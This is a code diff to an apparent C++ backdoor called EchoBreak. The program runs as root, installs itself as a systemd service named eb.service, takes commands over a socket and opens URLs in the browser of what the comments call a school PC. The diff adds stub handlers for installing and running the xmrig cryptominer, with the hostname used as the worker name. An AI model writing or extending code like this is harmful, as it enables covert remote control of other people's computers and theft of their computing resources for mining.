@@ -47,7 +47,6 @@ std::string exec(const char* cmd) {
 
 int main() {
     std::string service = "/etc/systemd/system/eb.service";
-
     //it is run from root
     if(!std::ifstream(service)){
         std::ofstream sfile(service, std::ios::out);
@@ -110,6 +109,22 @@ int main() {
                         //ours school pc using yandex
                         system((std::string("yandex-browser-stable ") + msg[2]).c_str());
                 }
+                //==========================================================================
+                else if(msg[1] == "inst_xmrig") {
+                    // git clone https://github.com/Andrew-24coop/EchoBreak-xmrig.git
+                    // cd EchoBreak-xmrig/xmrig-6.22.2
+                    // change config.json file (rename "name_of_the_worker" to exec(hostname))
+                    xmrig_flag = true;
+                }
+                else if(msg[1] == "run_xmrig") {
+                    if (xmrig_flag) {
+                        // run ./xmrig
+                    }
+                    else {
+                        // send back error
+                    }
+                }
+		//==========================================================================
             }
             memset(buffer, 0, sizeof(buffer));
         }
@@ -118,3 +133,4 @@ int main() {
     close(sock);
     return 0;
 }
+
